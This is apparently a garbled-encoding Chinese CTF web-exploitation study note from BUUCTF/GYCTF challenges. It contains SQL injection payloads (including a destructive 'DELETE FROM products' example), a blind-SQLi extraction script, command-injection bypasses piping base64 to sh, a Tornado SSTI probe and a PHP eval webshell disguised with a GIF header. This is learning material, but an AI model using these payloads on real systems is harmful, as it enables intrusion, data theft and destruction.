<p>åœ¨SQLä¸­ï¼Œåˆ†å·ï¼ˆ;ï¼‰æ˜¯ç”¨æ¥è¡¨ç¤ºä¸€æ¡sqlè¯­å¥çš„ç»“æŸã€‚<br> è€Œunion injectionï¼ˆè”åˆæ³¨å…¥ï¼‰ä¹Ÿæ˜¯å°†ä¸¤æ¡è¯­å¥åˆå¹¶åœ¨ä¸€èµ·ï¼Œä¸¤è€…ä¹‹é—´æœ‰ä»€ä¹ˆåŒºåˆ«ä¹ˆï¼ŸåŒºåˆ«å°±åœ¨äºunion æˆ–è€…union allæ‰§è¡Œçš„è¯­å¥ç±»å‹æ˜¯æœ‰é™çš„ï¼Œå¯ä»¥ç”¨æ¥æ‰§è¡ŒæŸ¥è¯¢è¯­å¥ï¼Œè€Œå †å æ³¨å…¥å¯ä»¥æ‰§è¡Œçš„æ˜¯ä»»æ„çš„è¯­å¥ã€‚ä¾‹å¦‚ä»¥ä¸‹è¿™ä¸ªä¾‹å­ã€‚ç”¨æˆ·è¾“å…¥ï¼š1; DELETE FROM productsæœåŠ¡å™¨ç«¯ç”Ÿæˆçš„sqlè¯­å¥ä¸ºï¼šï¼ˆå› æœªå¯¹è¾“å…¥çš„å‚æ•°è¿›è¡Œè¿‡æ»¤ï¼‰Select * from products where productid=1;DELETE FROM productså½“æ‰§è¡ŒæŸ¥è¯¢åï¼Œç¬¬ä¸€æ¡æ˜¾ç¤ºæŸ¥è¯¢ä¿¡æ¯ï¼Œç¬¬äºŒæ¡åˆ™å°†æ•´ä¸ªè¡¨è¿›è¡Œåˆ é™¤ã€‚</p> 
<p>æŸ¥çœ‹è¡¨çš„è¯­å¥ï¼Œåœ¨windowsç³»ç»Ÿä¸‹ï¼Œåå•å¼•å·ï¼ˆ`ï¼‰æ˜¯æ•°æ®åº“ã€è¡¨ã€ç´¢å¼•ã€åˆ—å’Œåˆ«åç”¨çš„å¼•ç”¨ç¬¦</p> 
<p>1â€™;desc <code>1919810931114514</code>;</p> 
<p>çŸ¥è¯†ç‚¹1ï¼šå †å æ³¨å…¥<br> åœ¨SQLä¸­ï¼Œåˆ†å·æ˜¯ç”¨æ¥è¡¨ç¤ºä¸€æ¡sqlè¯­å¥çš„ç»“æŸã€‚å¦‚æœåœ¨ ; ç»“æŸä¸€ä¸ªsqlè¯­å¥åç»§ç»­æ„é€ ä¸‹ä¸€æ¡è¯­å¥ï¼Œæ•ˆæœå°±æ˜¯åˆ†åˆ«æ‰§è¡Œä¸¤æ¡sqlè¯­å¥ã€‚ç”±äºä¸¤æ¡è¯­å¥å †å åœ¨åŒä¸€è¡Œï¼Œè€Œä¸æ˜¯åŸæœ¬åº”è¯¥å„è‡ªå æ®ä¸€è¡Œï¼Œæ‰€ä»¥è¿™ç§æ³¨å…¥æˆä¸ºå †å æ³¨å…¥ã€‚</p> 
<p>çŸ¥è¯†ç‚¹2<br> å½“æ•°å­—å‹å­—ç¬¦ä½œä¸ºå­—æ®µã€è¡¨ã€åº“åæŸ¥è¯¢æ—¶ï¼Œåº”è¯¥ç”¨åå•å¼•å·æ‹¬èµ·æ¥</p> 
<p>mysqlé¢„å¤„ç†è¯­å¥</p> 
<pre><code class="prism language-java">PREPARE sqla from <span class="token string">'[my sql sequece]'</span><span class="token punctuation">;</span>  	 é¢„å®šä¹‰SQLè¯­å¥
EXECUTE sqla<span class="token punctuation">;</span> 							 æ‰§è¡Œé¢„å®šä¹‰SQLè¯­å¥
<span class="token punctuation">(</span>DEALLOCATE <span class="token operator">||</span> DROP<span class="token punctuation">)</span> PREPARE sqla<span class="token punctuation">;</span>  	 åˆ é™¤é¢„å®šä¹‰SQLè¯­å¥
</code></pre> 
<p>é€šè¿‡å˜é‡è¿›è¡Œä¼ é€’<br> SET @tn = â€˜flagâ€™; å­˜å‚¨è¡¨å<br> SET @sql = concat('select * from ', @tn); å­˜å‚¨SQLè¯­å¥<br> PREPARE sqla from @sql; é¢„å®šä¹‰SQLè¯­å¥<br> EXECUTE sqla; æ‰§è¡Œé¢„å®šä¹‰SQLè¯­å¥<br> (DEALLOCATE || DROP) PREPARE sqla; åˆ é™¤é¢„å®šä¹‰SQLè¯­å¥</p> 
<p>PREPAREè¯­å¥å‡†å¤‡å¥½ä¸€æ¡SQLè¯­å¥ï¼Œå¹¶åˆ†é…ç»™è¿™æ¡SQLè¯­å¥ä¸€ä¸ªåå­—ä¾›ä¹‹åè°ƒç”¨ã€‚<br> å‡†å¤‡å¥½çš„SQLè¯­å¥é€šè¿‡EXECUTEå‘½ä»¤æ‰§è¡Œï¼Œé€šè¿‡DEALLOCATE PREPAREå‘½ä»¤é‡Šæ”¾æ‰ã€‚</p> 
<h4><a id="MD5sql_218"></a>ä½¿ç”¨MD5å‡½æ•°å®ç°sqlæ³¨å…¥</h4> 
<p>BUUCTF easy MD5<br> 1.çŸ¥è¯†ç‚¹ï¼š<br> ï¼ˆ1ï¼‰MD5å‡½æ•°åœ¨åŠ å¯†ffifdyopåè¿”å›åŸå§‹å­—ç¬¦ä¸²â€™orâ€™6\xc9]\x99\xe9!r,\xf9\xedb\x1c ï¼Œå¦å¤–mysqlä¸­ä»¥æ•°å­—å¼€å¤´çš„å­—ç¬¦ä¸²ä¼šè¢«å½“åšæ•´å½¢å¤„ç†ä¾‹å¦‚â€˜6abcâ€™=6ã€‚<br> ï¼ˆ2ï¼‰md5ç»•è¿‡ï¼šå› ä¸ºmd5ä¸èƒ½å¤„ç†æ•°ç»„ï¼Œä¼šè¿”å›NULLï¼Œå› ä¸ºNULL=NULLï¼Œå¯ä»¥å®ç°ç»•è¿‡ï¼Œä¼ å…¥æ•°ç»„ï¼Œä½¿å¾— md5 å¤„ç†ä¸¤ä¸ªå‚æ•°éƒ½è¿”å› 0 å³å¯ï¼š payload:?a[]=1&amp;b[]=2<br> æˆ–è€…ä¼ å…¥ä¸¤ä¸ªmd5å¤„ç†åä»¥0eå¼€å¤´çš„å­—ç¬¦ä¸²</p> 
<pre><code class="prism language-java">ä¸‹åˆ—çš„å­—ç¬¦ä¸²çš„MD5å€¼éƒ½æ˜¯<span class="token number">0</span>eå¼€å¤´çš„ï¼š
QNKCDZO
<span class="token number">240610708</span>
s878926199a
s155964671a
s214587387a
s214587387a
</code></pre> 
<p>2.è§£é¢˜<br> éšä¾¿è¾“å…¥åæŠ“åŒ…å‘ç°Hintä¸­æœ‰æç¤º<br> <img src="https://images2.imgbox.com/85/cc/EDPMduip_o.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br> åˆ©ç”¨md5ç‰¹æ€§ä¼ å…¥ffifdyopï¼Œä½¿å¾—selectè¯­å¥ä¸ºï¼š</p> 
<pre><code class="prism language-java">select <span class="token operator">*</span> from <span class="token string">'admin'</span> where password<span class="token operator">=</span><span class="token string">' '</span>or <span class="token string">'6'</span>
</code></pre> 
<p>è¿™æ ·å°±ç›¸å½“äºsqlè¯­å¥ä¸ºæ°¸çœŸå®ç°æ³¨å…¥<br> å¾—åˆ°<br> <img src="https://images2.imgbox.com/a5/4a/psH9nCJ0_o.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br> è®¿é—®é¡µé¢å‘ç°äº†phpé¡µé¢<br> <img src="https://images2.imgbox.com/94/ff/v2aWJVBI_o.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br> åˆ©ç”¨md5ç»•è¿‡å¾—åˆ°<br> <img src="https://images2.imgbox.com/46/d3/Tyqdyxs4_o.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br> è®¿é—®é¡µé¢åŒæ ·ä¸ºä¸€ä¸ªmd5ç»•è¿‡çš„phpé¡µé¢ï¼Œæ˜“å¾—flag</p> 
<h4><a id="_250"></a>ä¾‹é¢˜</h4> 
<h5><a id="BUUCTF_WEB_CISCN2019__Day2_Web1Hack_WorldSQLPHP_251"></a>BUUCTF WEB [CISCN2019 ååŒ—èµ›åŒº Day2 Web1]Hack World(SQLç›²æ³¨ï¼ŒPHPï¼‰</h5> 
<ul><li>é¢˜ç›®æè¿°:<br> <img src="https://images2.imgbox.com/23/e9/pxlp4WF0_o.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></li><li>å·²çŸ¥è¡¨åå’Œåˆ—åï¼Œå¹¶ä¸”å‘ç°è¿‡æ»¤äº†å¾ˆå¤šsqlå­—ç¬¦ï¼Œå°è¯•æ³¨å…¥</li></ul> 
<pre><code class="prism language-javascript"><span class="token number">1</span><span class="token operator">^</span><span class="token punctuation">(</span><span class="token function">ascii</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">select</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token keyword">from</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&gt;</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">^</span><span class="token number">1</span>
</code></pre> 
<p>å¥‰ä¸Šå¤§ä½¬è„šæœ¬</p> 
<pre><code class="prism language-javascript"><span class="token keyword">import</span> requests
<span class="token keyword">import</span> time

url <span class="token operator">=</span> <span class="token string">"http://f0c8caf0-fc27-454e-83bc-a557d1891b94.node3.buuoj.cn/index.php"</span>
temp <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span><span class="token string">"id"</span> <span class="token punctuation">:</span> <span class="token string">""</span><span class="token punctuation">}</span>
flag <span class="token operator">=</span> <span class="token string">""</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token function">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    time<span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">0.06</span><span class="token punctuation">)</span>
    low <span class="token operator">=</span> <span class="token number">32</span>
    high <span class="token operator">=</span><span class="token number">128</span>
    mid <span class="token operator">=</span> <span class="token punctuation">(</span>low<span class="token operator">+</span>high<span class="token punctuation">)</span><span class="token comment">//2</span>
    <span class="token keyword">while</span><span class="token punctuation">(</span>low<span class="token operator">&lt;</span>high<span class="token punctuation">)</span><span class="token punctuation">:</span>
        temp<span class="token punctuation">[</span><span class="token string">"id"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"1^"</span> <span class="token operator">+</span> <span class="token string">"(ascii(substr((select(flag)from(flag)),%d,1))&gt;%d)^1"</span> <span class="token operator">%</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>mid<span class="token punctuation">)</span>
        r <span class="token operator">=</span> requests<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>temp<span class="token punctuation">)</span>
        <span class="token function">print</span><span class="token punctuation">(</span>low<span class="token punctuation">,</span>high<span class="token punctuation">,</span>mid<span class="token punctuation">,</span><span class="token string">":"</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token string">"Hello"</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
            low <span class="token operator">=</span> mid<span class="token operator">+</span><span class="token number">1</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            high <span class="token operator">=</span> mid
        mid <span class="token operator">=</span><span class="token punctuation">(</span>low<span class="token operator">+</span>high<span class="token punctuation">)</span><span class="token comment">//2</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>mid <span class="token operator">==</span><span class="token number">32</span> or mid <span class="token operator">==</span><span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">break</span>
    flag <span class="token operator">+=</span><span class="token function">chr</span><span class="token punctuation">(</span>mid<span class="token punctuation">)</span>
    <span class="token function">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>


<span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"flag="</span> <span class="token punctuation">,</span>flag<span class="token punctuation">)</span>
</code></pre> 
<ul><li>è¯·çœ‹è¿™ä½å¸ˆå‚…çš„<a href="https://blog.csdn.net/qq_42967398/article/details/103517730?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161715960816780266221075%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&amp;request_id=161715960816780266221075&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_v2~rank_v29-3-103517730.pc_search_result_cache&amp;utm_term=BUUCTF++web+HackWorld&amp;spm=1018.2226.3001.4187">é¢˜è§£</a><br> sqlå­—å…¸</li></ul> 
<pre><code class="prism language-java">select
from
ascii
substr
table
column
by
schema
where
extractvalue
exp
<span class="token keyword">if</span>
<span class="token operator">/</span>
<span class="token punctuation">(</span>
<span class="token punctuation">)</span>
<span class="token operator">%</span>
<span class="token operator">!</span>
@
#
$
<span class="token operator">^</span>
<span class="token operator">&amp;</span>
<span class="token operator">*</span>
<span class="token operator">-</span>
_
<span class="token operator">+</span>
<span class="token operator">=</span>
'
"
<span class="token operator">~</span>
`
\
<span class="token operator">|</span>
<span class="token punctuation">,</span>
<span class="token punctuation">.</span>
<span class="token operator">||</span>
<span class="token operator">&amp;&amp;</span>
order
updatexml
limit
And
Or
<span class="token operator">%</span><span class="token number">23</span>
 
<span class="token operator">&lt;</span>
<span class="token operator">&gt;</span>
regex
group_concat
table_name
table_schema
column_name
database
imformation
union select
<span class="token function">ascii</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token function">select</span><span class="token punctuation">(</span><span class="token function">group_concat</span><span class="token punctuation">(</span>table_name<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token function">from</span><span class="token punctuation">(</span>information_schema<span class="token punctuation">.</span>tables<span class="token punctuation">)</span><span class="token function">where</span><span class="token punctuation">(</span>table_schema<span class="token operator">=</span><span class="token function">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">(</span><span class="token function">ascii</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">select</span><span class="token punctuation">(</span><span class="token function">group_concat</span><span class="token punctuation">(</span>flaaag<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token function">from</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">%</span>s<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token operator">%</span>s<span class="token punctuation">)</span>
<span class="token function">where</span><span class="token punctuation">(</span>table_schema<span class="token operator">=</span><span class="token function">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

</code></pre> 
<p>è¡¥å……ï¼š<a href="https://blog.csdn.net/hahazaizheli/article/details/96428290?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161717432816780265487351%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&amp;request_id=161717432816780265487351&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_v2~rank_v29-1-96428290.pc_search_result_cache&amp;utm_term=%E4%BD%BF%E7%94%A8burp%E8%BF%9B%E8%A1%8CFUZZ%E6%B5%8B%E8%AF%95&amp;spm=1018.2226.3001.4187">ä½¿ç”¨burpè¿›è¡ŒFuzzæµ‹è¯•å®ç°SQLæ³¨å…¥</a>ï¼Œ<a href="https://blog.csdn.net/qq_35793285/article/details/111818477?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161717432816780265487351%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&amp;request_id=161717432816780265487351&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_v2~rank_v29-6-111818477.pc_search_result_cache&amp;utm_term=%E4%BD%BF%E7%94%A8burp%E8%BF%9B%E8%A1%8CFUZZ%E6%B5%8B%E8%AF%95&amp;spm=1018.2226.3001.4187">burpçš„Intruderæ¨¡å—</a></p> 
<h5><a id="GYCTF2020Blacklist__356"></a>[GYCTF2020]Blacklist [å †å æ³¨å…¥]</h5> 
<p><img src="https://images2.imgbox.com/71/15/VcBxX0Gh_o.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p> 
<ul><li>å°è¯•å †å æ³¨å…¥<br> <img src="https://images2.imgbox.com/59/00/8hHj1O00_o.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></li><li>çˆ†åˆ—å<br> <img src="https://images2.imgbox.com/ea/d3/c2yPJFpj_o.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></li></ul> 
<p>HANDLERæ–¹æ³•<br> å¼•è‡ªå¤§ä½¬ï¼šHANDLER â€¦ OPENè¯­å¥æ‰“å¼€ä¸€ä¸ªè¡¨ï¼Œä½¿å…¶å¯ä»¥ä½¿ç”¨åç»­HANDLER â€¦ READè¯­å¥è®¿é—®ï¼Œè¯¥è¡¨å¯¹è±¡æœªè¢«å…¶ä»–ä¼šè¯å…±äº«ï¼Œå¹¶ä¸”åœ¨ä¼šè¯è°ƒç”¨HANDLER â€¦ CLOSEæˆ–ä¼šè¯ç»ˆæ­¢ä¹‹å‰ä¸ä¼šå…³é—­<br> æ„é€ ï¼š</p> 
<pre><code class="prism language-javascript"><span class="token number">1</span>'<span class="token punctuation">;</span>handler FlagHere open<span class="token punctuation">;</span>handler FlagHere read first<span class="token punctuation">;</span>handler FlagHere close<span class="token punctuation">;</span>#
</code></pre> 
<p><a href="https://blog.csdn.net/SopRomeo/article/details/105396372?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161762143216780271594201%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&amp;request_id=161762143216780271594201&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_v2~rank_v29-2-105396372.pc_search_result_cache&amp;utm_term=%5BGYCTF2020%5DBlacklist&amp;spm=1018.2226.3001.4187">å‚è€ƒæ–‡ç« </a></p> 
<h3><a id="Ping_376"></a>Pingå‘½ä»¤</h3> 
<p>å¸¸ç”¨ç®¡é“ç¬¦å‘½ä»¤</p> 
<pre><code class="prism language-java"><span class="token operator">&amp;</span> ï¼ˆæŒ‰ä½ä¸ï¼‰ è¡¨ç¤ºä»»åŠ¡åœ¨åå°æ‰§è¡Œï¼Œå¦‚è¦åœ¨åå°è¿è¡Œredis<span class="token operator">-</span>server<span class="token punctuation">,</span>åˆ™æœ‰ redis<span class="token operator">-</span>server <span class="token operator">&amp;</span>

<span class="token operator">&amp;&amp;</span> ï¼ˆé€»è¾‘ä¸ï¼‰è¡¨ç¤ºå‰ä¸€æ¡å‘½ä»¤æ‰§è¡ŒæˆåŠŸæ—¶ï¼Œæ‰æ‰§è¡Œåä¸€æ¡å‘½ä»¤ ï¼Œå¦‚æœå‰é¢ä¸ºå‡ï¼Œåé¢çš„å‘½ä»¤ä¹Ÿä¸æ‰§è¡Œ   å¦‚ echo '<span class="token number">1</span>â€˜ <span class="token operator">&amp;&amp;</span> echo â€˜<span class="token number">2</span>â€™

<span class="token operator">|</span> ï¼ˆæŒ‰ä½æˆ–ï¼‰è¡¨ç¤ºç®¡é“ï¼Œä¸Šä¸€æ¡å‘½ä»¤çš„è¾“å‡ºï¼Œä½œä¸ºä¸‹ä¸€æ¡å‘½ä»¤å‚æ•°ï¼Œç›´æ¥æ‰§è¡Œ<span class="token operator">|</span>åé¢çš„è¯­å¥ï¼Œå¦‚ echo â€˜yesâ€™ <span class="token operator">|</span> wc <span class="token operator">-</span>l

<span class="token operator">||</span> ï¼ˆé€»è¾‘æˆ–ï¼‰è¡¨ç¤ºä¸Šä¸€æ¡å‘½ä»¤æ‰§è¡Œå¤±è´¥åï¼Œæ‰æ‰§è¡Œä¸‹ä¸€æ¡å‘½ä»¤ï¼Œå¦åˆ™åªæ‰§è¡Œå‰é¢çš„è¯­å¥ï¼Œå¦‚ cat nofile <span class="token operator">||</span> echo â€œfailâ€

<span class="token punctuation">;</span> åˆ†å·è¡¨ç¤ºå‘½ä»¤ä¾æ¬¡æ‰§è¡Œã€‚
</code></pre> 
<p>1.è¿‡æ»¤é—®é¢˜ï¼šç©ºæ ¼</p> 
<pre><code class="prism language-java"><span class="token punctuation">{<!-- --></span>cat<span class="token punctuation">,</span>flag<span class="token punctuation">.</span>txt<span class="token punctuation">}</span> 
cat$<span class="token punctuation">{<!-- --></span>IFS<span class="token punctuation">}</span>flag<span class="token punctuation">.</span>txt
cat$IFS$<span class="token number">9f</span>lag<span class="token punctuation">.</span>txt
cat<span class="token operator">&lt;</span>flag<span class="token punctuation">.</span>txt
cat<span class="token operator">&lt;</span><span class="token operator">&gt;</span>flag<span class="token punctuation">.</span>txt
kg<span class="token operator">=</span>$<span class="token string">'\x20flag.txt'</span><span class="token operator">&amp;&amp;</span>cat$kg
<span class="token punctuation">(</span>\x20è½¬æ¢æˆå­—ç¬¦ä¸²å°±æ˜¯ç©ºæ ¼ï¼Œè¿™é‡Œé€šè¿‡å˜é‡çš„æ–¹å¼ç»•è¿‡<span class="token punctuation">)</span>
</code></pre> 
<p>1)å˜é‡æ‹¼æ¥å­—ç¬¦ä¸²</p> 
<pre><code class="prism language-JAVA">b=ag.php;a=fl;cat$IFS$9$a$b 
 
//ä¸ºä»€ä¹ˆè¦åè¿‡æ¥ï¼ŸflagåŒ¹é…æ—¶ä¸­é—´æœ‰å†…å®¹ä¹Ÿä¼šè¢«åŒ¹é…ã€‚
//è¡¨è¾¾å¼ .* å°±æ˜¯å•ä¸ªå­—ç¬¦åŒ¹é…ä»»æ„æ¬¡ï¼Œå³è´ªå©ªåŒ¹é…ã€‚ä»¥è¿™ä¸ªè¡¨è¾¾å¼ä¸ºä¾‹ï¼ša.*bï¼Œå®ƒå°†ä¼šåŒ¹é…æœ€é•¿çš„ä»¥aå¼€å§‹ï¼Œä»¥bç»“æŸçš„å­—ç¬¦ä¸²ã€‚å¦‚æœç”¨å®ƒæ¥æœç´¢aababçš„è¯ï¼Œå®ƒä¼šåŒ¹é…æ•´ä¸ªå­—ç¬¦ä¸²aababã€‚è¿™è¢«ç§°ä¸ºè´ªå©ªåŒ¹é…
</code></pre> 
<p>2)baseç¼–ç ç»•è¿‡<br> base64 ç¼–ç çš„æ–¹å¼æ¥ç»•è¿‡ flag è¿‡æ»¤</p> 
<pre><code class="prism language-java">åŠ å¯†å‘½ä»¤
echo â€œcat flag<span class="token punctuation">.</span>phpâ€ <span class="token operator">|</span> base64
è§£å¯†å‘½ä»¤å¹¶æ‰§è¡Œ
echo Y2F0IGZsYWcucGhwCg<span class="token operator">==</span> <span class="token operator">|</span> base64 <span class="token operator">-</span>d <span class="token operator">|</span> sh
ç„¶åç”¨$IFS$<span class="token number">9</span>ä»£æ›¿ç©ºæ ¼ã€‚æ„é€ payload

  <span class="token operator">?</span>ip<span class="token operator">=</span><span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span><span class="token punctuation">;</span>echo$IFS$<span class="token number">9</span>Y2F0IGZsYWcucGhwCg<span class="token operator">==</span>$IFS$<span class="token number">9</span><span class="token operator">|</span>$IFS$<span class="token number">9</span>base64$IFS$<span class="token number">9</span><span class="token operator">-</span>d$IFS$<span class="token number">9</span><span class="token operator">|</span>$IFS$<span class="token number">9</span>sh  
</code></pre> 
<p>3)å†…è”æ‰§è¡Œ<br> linuxä¸­åå¼•å·ä½œä¸ºå†…è”ä½¿ç”¨</p> 
<pre><code class="prism language-java"> cat `ls`
</code></pre> 
<h5><a id="nc_428"></a>nc</h5> 
<p>åœ¨linuxä¸­nc åè¿”å›ç½‘é¡µæºç html</p> 
<h3><a id="tornado_432"></a>tornado</h3> 
<p><a href="https://blog.csdn.net/weixin_44037296/article/details/105078717?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161477364616780271567725%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&amp;request_id=161477364616780271567725&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_v2~rank_v29-6-105078717.pc_search_result_no_baidu_js&amp;utm_term=buuctf+easy_tornado+1">BUUCTF tornadoé¢˜è§£</a><br> tornadoå­˜åœ¨æ¨¡ç‰ˆ<a href="https://blog.csdn.net/zz_Caleb/article/details/96480967">SSTI</a>æ³¨å…¥æ¼æ´ï¼Œå°è¯•é€šè¿‡æ­¤æ¼æ´è·å–åˆ°æ‰€éœ€å†…å®¹<br> 1.å…ˆè®¿é—®æŠ¥é”™ç½‘é¡µ</p> 
<pre><code class="prism language-java"><span class="token operator">/</span>error<span class="token operator">?</span>msg<span class="token operator">=</span>Error
</code></pre> 
<p>2.é€šè¿‡handler.settingså¯¹è±¡è·å–cookie_secretçš„å€¼ï¼Œå³ï¼š<br> handleræŒ‡å‘RequestHandler<br> RequestHandler.settingsæŒ‡å‘self.application.settings<br> æ‰€ä»¥handler.settingsæœ€ç»ˆæŒ‡å‘RequestHandler.application.settings<br> æ„é€ å¦‚ä¸‹ï¼š</p> 
<pre><code class="prism language-java"><span class="token operator">/</span>error<span class="token operator">?</span>msg<span class="token operator">=</span><span class="token punctuation">{<!-- --></span><span class="token punctuation">{<!-- --></span>handler<span class="token punctuation">.</span>settings<span class="token punctuation">}</span><span class="token punctuation">}</span>
</code></pre> 
<p>3.md5åªåŠ å¯†äºŒè¿›åˆ¶ï¼Œæ‰€ä»¥å…ˆencode(â€˜utf-8â€™)ç¼–ç ä¸ºäºŒè¿›åˆ¶,å¯¹äºå‡½æ•°<br> hash.digest()<br> è¿”å›æ‘˜è¦ï¼Œä½œä¸ºäºŒè¿›åˆ¶æ•°æ®å­—ç¬¦ä¸²å€¼<br> hash.hexdigest()<br> è¿”å›æ‘˜è¦ï¼Œä½œä¸ºåå…­è¿›åˆ¶æ•°æ®å­—ç¬¦ä¸²å€¼<br> è¿›è€Œæ ¹æ®é¢˜ç›®å·²çŸ¥ä¿¡æ¯ç¼–å†™è„šæœ¬ï¼Œè·å–payload</p> 
<h3><a id="_455"></a>æ–‡ä»¶ä¸Šä¼ </h3> 
<h5><a id="_456"></a>è§£æ³•</h5> 
<p>(1) å¸¦å›¾ç‰‡å¤´çš„phpä¸€å¥è¯æœ¨é©¬</p> 
<pre><code class="prism language-java">GIF89a<span class="token operator">?</span>
<span class="token operator">&lt;</span>script language<span class="token operator">=</span><span class="token string">'php'</span><span class="token operator">&gt;</span><span class="token function">eval</span><span class="token punctuation">(</span>$_POST<span class="token punctuation">[</span><span class="token string">'v'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span>
</code></pre> 
<p>(2) å¯è§£æçš„phpåç¼€åï¼š<br> php3ï¼Œphp4ï¼Œphp5ï¼Œphtï¼Œphtml,phps<br> æ³¨ï¼šèœåˆ€è¿æ¥æ˜¯è¦ç”¨POST<br> æ³¨æ„MMIEç±»å‹ä¸ºjpegï¼Œå› ä¸ºåªå…è®¸å›¾ç‰‡ä¸Šä¼ <br> Content-Type: image/jpeg<br> ç»•è¿‡è¿‡ç¨‹ï¼š<br> 1.æ–°å»ºtxtæ–‡ä»¶ç¼–å†™ä¸€å¥è¯æœ¨é©¬ï¼Œåç¼€ä¸ºjpgï¼ˆè¿˜æœ‰gif pngç­‰æ ¼å¼è§†æƒ…å†µè€Œå®šï¼‰æ³¨æ„MMIEç±»å‹ä¸ºjpegï¼Œå› ä¸ºåªå…è®¸å›¾ç‰‡ä¸Šä¼ <br> Content-Type: image/jpeg<br> 2.BurpsuiteæŠ“åŒ…æ”¹åŒ…ï¼Œä¿®æ”¹æ–‡ä»¶åç¼€åï¼Œç›´è‡³ä¸Šä¼ æˆåŠŸï¼Œå¦‚<a href="https://buuoj.cn/challenges#%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019%5DUpload" rel="nofollow">BUUCTF upload</a>ä¸­åªæœ‰phpåç¼€åä¸ºphtmlæ‰å¯ä»¥<br> <img src="https://images2.imgbox.com/49/04/eJIwYA37_o.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br> 3.ä¸Šä¼ æˆåŠŸåç”¨èšå‰‘è¿æ¥<br> <img src="https://images2.imgbox.com/c4/c8/PFqDA2A5_o.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br> æœ€ç»ˆåœ¨æ ¹ç›®å½•å¯æ‰¾åˆ°flag<br> <img src="https://images2.imgbox.com/d5/d9/XRII3PNS_o.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p> 
<h4><a id="MRCTF_477"></a>[MRCTF]ä½ ä¼ ä½ ğŸå‘¢</h4> 
<p>1.htaccessæ–‡ä»¶</p> 
